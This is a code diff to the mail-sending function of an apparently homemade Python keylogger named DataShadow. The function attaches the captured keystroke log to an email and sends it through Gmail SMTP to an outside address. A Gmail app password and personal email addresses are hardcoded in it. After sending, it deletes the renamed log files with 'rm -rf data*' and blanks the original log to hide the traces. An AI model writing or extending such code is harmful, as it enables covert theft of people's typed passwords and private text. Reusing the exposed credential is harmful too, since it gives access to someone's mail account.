@@ -10,21 +10,24 @@ def sendmail():
             senha_do_gmail = "lzbatebfonurcjif"
 
             msg = EmailMessage()
-            msg['Subject'] = "Enviando email com python"
-            msg['From'] = "hildofilhohotmail.com@gmail.com"
+            msg['Subject'] = "Enviando relatório de </DataShadow>"
+            msg['From'] = "yhelenasw@gmail.com"
             msg['To'] = "yhelenasw@gmail.com"
-            msg.set_content("Segue o relatório de teclas da Crypt0nita ")
+            msg.set_content("Segue o relatório de teclas do DataShadow")
 
             with open("logs.txt", "rb") as content_file:
-            
+                hora_now = datetime.datetime.now()
+                hora_formatada = hora_now.strftime("%Y-%m-%d_%H-%M-%S")
+                rename = os.rename("logs.txt", f"data_{hora_formatada}.txt")
+
                 content = content_file.read()
-                msg.add_attachment(content, maintype='application', subtype='pdf', filename='logs.txt')
+                msg.add_attachment(content, maintype='application', subtype='pdf', filename=f"data_{hora_formatada}.txt")
 
             with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
             
                 smtp.login(email, senha_do_gmail)
                 smtp.send_message(msg)
-            
+            os.system("rm -rf data*")
             os.system("echo '' > logs.txt")
 
 
